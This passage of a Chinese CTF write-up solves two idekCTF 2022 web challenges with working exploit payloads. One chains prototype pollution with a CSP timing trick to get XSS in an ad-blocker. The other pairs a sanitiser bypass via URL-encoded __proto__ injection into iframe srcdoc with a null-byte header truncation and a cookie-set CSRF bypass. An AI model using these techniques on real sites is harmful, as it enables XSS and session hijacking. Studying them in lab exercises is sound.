</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numChildren</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">numChildren</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>        }	
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">numBlocked</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">numChildren</span>;
</span></span></code></pre></div><p>在进行下一步前，先介绍下题目的业务逻辑：介绍是一个广告屏蔽器，输入<code>url</code>后作为<code>&lt;iframe id=viewer&gt;</code>的<code>src</code>去访问，然后获得指定url页面中的<code>&lt;iframe&gt;</code>标签，对其遍历递归使用<code>clearFrame</code>函数清除达到屏蔽广告的效果，然后对于访问是会有记录的，可以导出记录和合并记录。回到<code>clearFrame</code>函数，只要<code>frame.length</code>可控，我们就可以<code>XSS</code>。在合并记录中使用到了<code>combineHistories</code>函数，其中代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">combineHistories</span>(<span style="color:#a6e22e">history</span>, <span style="color:#a6e22e">addedHistory</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">date</span>, <span style="color:#a6e22e">record</span>] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">addedHistory</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">date</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">history</span>)) <span style="color:#a6e22e">history</span>[<span style="color:#a6e22e">date</span>] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">v</span>] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">record</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">history</span>[<span style="color:#a6e22e">date</span>][<span style="color:#a6e22e">k</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">v</span>; <span style="color:#75715e">// 🅱️
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">history</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>其中的<code>addedHistory</code>我们完全可控，也就是这里存在原型链污染，这里的<code>history</code>是<code>window.blockHistory</code>，也就是直接污染<code>window</code>的原型，然后因为<code>frame</code>是<code>window</code>类型，所以当<code>frame[i]</code>不存在时，会找到使用<code>window.__proto__</code>的值。那么我们如何让<code>frame[i]</code>不存在呢，可以使用<code>location =</code>进行跳转，因为传入<code>clearFrame</code>的是window对象，而不是网页内容，第一次获得页面的<code>&lt;iframe&gt;</code>的数量，我们这里可以设置为2，然后跳转到一个没有<code>&lt;iframe&gt;</code>的页面，如果控制好时间这里的<code>frame[1]</code>是<code>undefined</code>，也就可以取得原型链污染后的值。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">PAYLOAD</span> <span style="color:#f92672">=</span> encodeURIComponent(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;__proto__&#34;</span>]<span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;length&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;img src=x onerror=\&#34;console.log(1)\&#34;&gt;&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;location&#34;</span><span style="color:#f92672">:</span> {},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:30011/import-history.html?history=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PAYLOAD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
</span></span></code></pre></div><p>那么如何控制时间，我尝试使用<code>setTimeout</code>发现其没有利用的可能，这里出题人用到的是<code>CSP</code>，在<code>clearFrame</code>的时候，会将<code>iframe</code>重定向到<code>/blocked.html</code>然后异步检测同源</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>		<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/blocked.html&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// wait until same-origin before logging the frame name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">debug</span>(<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;(no name)&#34;</span>, <span style="color:#e6db74">&#34;blocked&#34;</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>));
</span></span></code></pre></div><p>因为<code>iframe</code>被重定向到了<code>/blocked.html</code>所以是同源的，很快就结束了检测。这里使用<code>CSP</code>来阻止<code>iframe</code>内的重定向</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame-src &#39;none&#39;;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span></code></pre></div><p>因为执行这两个函数都是用的<code>await</code>所以会等待后面函数执行完后才会进行下一步</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">debug</span>(<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;(no name)&#34;</span>, <span style="color:#e6db74">&#34;blocked&#34;</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>));
</span></span></code></pre></div><p>然后在<code>sameOriginCheck</code>函数中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sameOriginCheck</span>(<span style="color:#a6e22e">frame</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tries</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">check</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">setInterval</span>(() =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tries</span><span style="color:#f92672">++</span>; <span style="color:#75715e">// keep trying until same-origin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tries</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">250</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">clearInterval</span>(<span style="color:#a6e22e">check</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">reject</span>(<span style="color:#e6db74">&#34;Maximum number of tries exceeded&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">origin</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">clearInterval</span>(<span style="color:#a6e22e">check</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resolve</span>();
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>如果没检测到同源，会最多循环<code>250</code>次，造成阻塞在<code>sameOriginCheck</code>位置的时候<code>location</code>跳转污染原型链，然后阻塞结束，继续<code>clearFrame</code>，然后<code>await clearFrame(frame[1]);</code>不存在，使用原型链污染后的值。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame-src &#39;none&#39;;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">onsecuritypolicyviolation</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">PAYLOAD</span> <span style="color:#f92672">=</span> encodeURIComponent(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;__proto__&#34;</span>]<span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;length&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&lt;img src=x onerror=\&#34;console.log(1)\&#34;&gt;&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;location&#34;</span><span style="color:#f92672">:</span> {},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://localhost:30011/import-history.html?history=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PAYLOAD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><h2 id="stargazer">Stargazer</h2>
<p>根据出题人<a href="https://github.com/nyxsorcerer/idekctf-2022-stargazer">@nyxmare</a>提供的payload进行学习，题目难，所以这题更多是去理解出题人的解法，没啥自己的想法</p>
<p>下载附件，先看一手bot，发现<code>flag</code>在<code>cookie</code>中，且设置的域为<code>&quot;domain&quot;:&quot;.backend.magic.world&quot;</code>，所以目标是后端的<code>XSS</code>。查看附件中nginx的配置，发现题目分为前后端，前后端分离，再看一眼前端就一个<code>index.html</code>，读了下代码，发现虽然可以原型链污染<code>&lt;iframe&gt;</code>执行任意JS，但是因为<code>bot</code>的域的原因，这里无法直接使用，然后后端有使用简单的<code>template</code>渲染，看了下写法，发现没有什么可以利用的。</p>
<p>根据<code>payload</code>发现<code>XSS</code>，在后端查看文件的路由中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Any</span>(<span style="color:#e6db74">&#34;/file/:uuid/:filename&#34;</span>, <span style="color:#a6e22e">viewFileHandler</span>, <span style="color:#a6e22e">isLoggedIn</span>)
</span></span></code></pre></div><p>这里接收两个参数，但是<code>viewFileHandler</code>只用到了<code>uuid</code>，所以<code>filename</code>可以随便设置，在<code>viewFileHandler</code>函数中</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232040325.png" alt="image-20230123204023104"></p>
<p>根据<code>UUID</code>在数据库中获得上传时传入的<code>FilesUpload</code>结构体数据</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FilesUpload</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">UUID</span>        <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Title</span>       <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ContentType</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Filename</span>    <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Username</span>    <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>然后将其设置在响应头中。这里作者在注册时在<code>Username</code>中使用了空字节来截断响应头，达到XSS的目的</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232133026.png" alt="image-20230123213302840"></p>
<p>既然XSS的点找到了，但是访问文件路由时需要<code>session</code>，也就需要我们先登录获取<code>set-cookie</code>到bot的环境下，但是访问<code>/login</code>接口需要<code>_csrf</code>令牌符合，根据配置</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Use</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFWithConfig</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFConfig</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">TokenLookup</span>:    <span style="color:#e6db74">&#34;form:_csrf,header:X-CSRF-TOKEN&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CookieHTTPOnly</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>	}))
</span></span></code></pre></div><p>发现只要访问<code>/login</code>时上传的表单中的<code>_csrf</code>和Cookie中的<code>_csrf</code>值一致就可绕过这个配置，请求不会被拒绝。表单中的<code>_csrf</code>加个<code>&lt;input&gt;</code>就行，就剩Cookie中的<code>_csrf</code>该如何设置呢。下面是这一段的payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">root_domain</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.magic.world&#34;</span>
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">URL_1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/?__proto%5f_.srcdoc[]=&lt;script\u003edocument.cookie=&#39;_csrf=nyxmare; Path=/login; Domain=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">root_domain</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;\u003c/script\u003e`</span>)
</span></span></code></pre></div><p>在前端<code>frontend.magic.world</code>中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> {<span style="color:#a6e22e">q</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">attr</span>({ <span style="color:#a6e22e">src</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">BASE_URL</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">q</span>,...})
</span></span></code></pre></div><p>解析当前<code>url</code>后使用<code>jquery</code>的<code>attr()</code>方法给选择的<code>iframe</code>属性赋值，在<code>parseParams</code>函数中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">re</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/([^&amp;=]+)=?([^&amp;]*)/g</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {},
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;?&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;?&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">return</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#66d9ef">return</span> {};
</span></span><span style="display:flex;"><span><span style="color:#75715e">// execute a createElement on every key and value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> ((<span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">re</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">query</span>))) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">e</span>[<span style="color:#ae81ff">1</span>]));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">e</span>[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">params</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这里会将请求的参数由<code>=</code>分割为<code>key</code>，<code>value</code>。其中对<code>key</code>进行检测，是否存在<code>__proto__</code>等类似字符，因为外层使用<code>decode</code>进行了一次url解码，所以我们可以使用url编码绕过这一个检测，然后将空对象和key，value作为参数传入<code>createElement</code>函数。第一次进入<code>createElement</code>函数时，检测到<code>.</code>进入if的第一个分支：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;.&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">new_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">/\.(.+)?/</span>)[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]]) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">new_key</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>]], <span style="color:#a6e22e">new_key</span>, <span style="color:#a6e22e">value</span>);	
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>如果这里的<code>list[0]</code>为<code>__proto__</code>属性，我们是不是就可以污染一个空对象的<code>prototype</code>属性，然后再经过一次<code>createElement</code>，这次我们需要经过的是第二个分支</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;[&#34;</span>);      <span style="color:#75715e">// key = srcdoc[]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>];                  <span style="color:#75715e">// key = srcdoc
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">list</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;]&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">list</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">index</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>) <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>])) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>].<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这里就污染了成功了<code>Object</code>的<code>prototype</code>，为什么在这里要使用数组呢，使用string进入第三分支也能污染</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">f</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>) <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>])) <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">key</span>][parseInt(<span style="color:#a6e22e">index</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span></code></pre></div><p>因为在<code>.attr()</code>中，in关键字无法对字符串使用</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232320914.png" alt="image-20230123232001852"></p>
<p>完成污染后，会对<code>&lt;iframe&gt;</code>设置<code>srcdoc</code>属性，且优先级高于<code>src</code></p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301232245262.png" alt="image-20230123224540071"></p>
<p>执行我们传入的js，为之前的登录请求添加<code>Cookie</code>属性绕过<code>_csrf</code>的限制</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_csrf=nyxmare; Path=/login; Domain=.magic.world&#39;</span>
